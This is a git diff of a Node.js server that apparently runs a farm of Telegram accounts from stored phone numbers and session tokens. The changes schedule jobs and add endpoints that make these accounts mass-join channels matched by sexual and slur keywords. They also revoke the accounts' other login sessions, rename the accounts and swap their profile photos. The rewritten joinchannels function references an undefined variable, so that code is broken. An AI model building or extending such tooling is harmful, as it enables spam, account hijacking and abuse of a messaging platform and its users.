@@ -131,17 +131,17 @@ try {
         if (now.getUTCDate() % 3 === 1) {
           await fetchWithTimeout(`${value.url}leavechannels`);
         }
-        let resp = await fetchWithTimeout(`${value.url}channelinfo`, { timeout: 200000 });
-        await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
-        if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 200) {
-          await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)
-          joinchannels(value.url);
-        }
+        await joinchannels(value)
       } catch (error) {
         console.log("Some Error: ", error.code);
       }
     }
     await fetchWithTimeout(`https://mychatgpt-pg6w.onrender.com/deletefiles`);
+  })
+
+
+  schedule.scheduleJob('test3', ' 25 8 * * * ', 'Asia/Kolkata', async () => {
+    await joinchannelForBufferClients();
   })
 
   schedule.scheduleJob('test3', ' 25 0 * * * ', 'Asia/Kolkata', async () => {
@@ -344,7 +344,7 @@ app.get('/activechannels/:limit/:skip', async (req, res, next) => {
   const skip = req.params.skip ? req.params.skip : 20
   const k = req.query?.k
   const db = ChannelService.getInstance();
-  const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k);
+  const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), [k], []);
   let resp = 'joinchannel:'
   result.forEach((channel) => {
     resp = resp + `@${channel.username}|`
@@ -430,11 +430,6 @@ app.get('/getuserdata', async (req, res, next) => {
   }
 });
 
-app.get('/joinchannel', async (req, res, next) => {
-  checkerclass.getinstance()
-  res.send('Hello World!');
-});
-
 app.get('/getuserdata2', async (req, res, next) => {
   checkerclass.getinstance()
   res.send('Hello World!');
@@ -486,7 +481,7 @@ app.get('/usermap', async (req, res) => {
 app.get('/getbufferclients', async (req, res) => {
   const db = ChannelService.getInstance();
   const result = []
-  const clients = await db.readBufferClients();
+  const clients = await db.readBufferClients({});
   clients.forEach((cli) => {
     result.push(cli.mobile);
   })
@@ -780,20 +775,23 @@ app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
     const user = await db.getUser({ mobile: number });
     if (!hasClient(user.mobile)) {
       const cli = await createClient(user.mobile, user.session, false);
-      const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k);
-      const client = await getClient(user.mobile);
-      let resp = ''
-      result.forEach((channel) => {
-        resp = resp + `@${channel.username}|`
-      })
       if (cli) {
+        const client = await getClient(user.mobile);
+        const channels = await client.channelInfo(true);
+        const keys = ['wife', 'adult', 'lanj', 'family', 'randi', 'bhabhi', 'telugu', 'tamil', 'friend', 'kannad', 'bihar', 'marat', 'india', 'boy', 'girl'];
+        const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids);
+        let resp = ''
+        result.forEach((channel) => {
+          resp = resp + `@${channel.username}|`
+        })
         await client.removeOtherAuths();
         await client.joinChannels(resp);
       } else {
+        console.log("Client Does not exist!")
       }
     }
   } catch (error) {
-    console.log("Some Error: ", error.code)
+    console.log("Some Error: ", error)
   }
 });
 
@@ -1216,6 +1214,24 @@ app.get('/receive', async (req, res, next) => {
   }
 });
 
+
+app.get('/joinchannel', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  try {
+    const userName = req.query.userName;
+    const data = userMap.get(userName.toLowerCase());
+    if (data) {
+      await joinchannels(data)
+    } else {
+      console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
+    }
+  } catch (error) {
+    console.log("Some Error: ", error.code);
+  }
+});
+
 app.get('/requestcall', async (req, res, next) => {
   res.send('Hello World!');
   next();
@@ -1567,22 +1583,30 @@ async function createInitializedObject() {
   return initializedObject;
 }
 
-async function joinchannels(url) {
-  const keys = ['wife', 'adult', 'lanj', 'randi', 'bhabhi', 'telugu', 'tamil', 'friends', 'family', 'chatting', 'boys', 'girls'];
-  const randomElement = keys[Math.floor(Math.random() * keys.length)];
-  const db = ChannelService.getInstance();
-  const channels = await db.getActiveChannels(100, 0, randomElement);
-  for (const channel of channels) {
-    try {
-      console.log(channel.username);
-      const username = channel?.username?.replace("@", '');
-      if (username) {
-        await fetchWithTimeout(`${url}joinchannel?username=${username}`);
-        await sleep(180000);
+async function joinchannels(value) {
+  try {
+    let resp = await fetchWithTimeout(`${value.url}channelinfo`, { timeout: 200000 });
+    await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
+    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 250) {
+      await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)
+      const keys = ['wife', 'adult', 'lanj', 'randi', 'bhabhi', 'telugu', 'tamil', 'friend', 'kannad', 'bihar', 'marat', 'india', 'family', 'chat', 'boy', 'girl'];
+      const db = ChannelService.getInstance();
+      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids);
+      for (const channel of channels) {
+        try {
+          console.log(channel.username);
+          const username = channel?.username?.replace("@", '');
+          if (username) {
+            await fetchWithTimeout(`${url}joinchannel?username=${username}`);
+            await sleep(180000);
+          }
+        } catch (error) {
+          console.log("Some Error: ", error.code)
+        }
       }
-    } catch (error) {
-      console.log("Some Error: ", error.code)
     }
+  } catch (error) {
+    console.log(error)
   }
 }
 
@@ -1688,7 +1712,7 @@ let goodIds = [];
 let badIds = [];
 async function checkBufferClients() {
   const db = await ChannelService.getInstance();
-  const clients = await db.readBufferClients();
+  const clients = await db.readBufferClients({});
   goodIds = [];
   badIds = [];
   if (clients.length < 30) {
@@ -1706,6 +1730,8 @@ async function checkBufferClients() {
         badIds.push(document.mobile);
         await db.deleteBufferClient(document);
       } else {
+        const channels = await client.channelInfo(true);
+        await db.insertInBufferClients({ mobile: document.mobile, channels: channels.ids.length });
         console.log(document.mobile, " :  ALL Good");
         goodIds.push(document.mobile)
       }
@@ -1803,8 +1829,10 @@ async function setUpClient(clientId, archieveOld) {
         const userCaps = username[0].toUpperCase() + username.slice(1)
         await client.updateUsername(`${userCaps}Redd`);
         await sleep(5000)
+        await client.deleteProfilePhotos();
+        await sleep(3000)
         await client.updatePrivacy();
-        await sleep(5000)
+        await sleep(3000)
         await client.updateProfilePic('./dp1.jpg');
         await sleep(1000);
         await client.updateProfilePic('./dp2.jpg');
@@ -1879,5 +1907,25 @@ function fetchNumbersFromString(inputString) {
     return result;
   } else {
     return '';
+  }
+}
+
+async function joinchannelForBufferClients() {
+  const db = ChannelService.getInstance();
+  const clients = await db.readBufferClients({ channels: { "$lt": 250 } }, 3)
+  for (const document of clients) {
+    const cli = await createClient(document.mobile, document.session);
+    if (cli) {
+      const client = await getClient(document.mobile);
+      const channels = await client.channelInfo(true);
+      const keys = ['wife', 'adult', 'lanj', 'family', 'randi', 'bhabhi', 'telugu', 'tamil', 'friend', 'kannad', 'bihar', 'marat', 'india', 'boy', 'girl'];
+      const result = await db.getActiveChannels(150, 0, keys, channels.ids);
+      let resp = ''
+      result.forEach((channel) => {
+        resp = resp + `@${channel.username}|`
+      })
+      console.log("joingn Starting")
+      client.joinChannels(resp);
+    }
   }
 }
